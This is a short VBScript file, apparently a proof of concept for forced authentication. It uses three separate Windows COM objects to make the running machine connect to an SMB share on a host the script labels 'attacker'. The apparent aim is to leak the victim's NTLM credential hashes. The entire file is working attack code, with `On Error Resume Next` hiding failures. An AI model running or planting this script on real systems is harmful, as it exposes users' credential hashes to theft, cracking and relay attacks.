On Error Resume Next

attacker = "\\192.168.247.131\leak"

Set sh = CreateObject("Shell.Application")
sh.NameSpace attacker

Set fso = CreateObject("Scripting.FileSystemObject")
fso.OpenTextFile attacker & "\trigger.txt", 1

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", attacker & "\test", False
http.Send
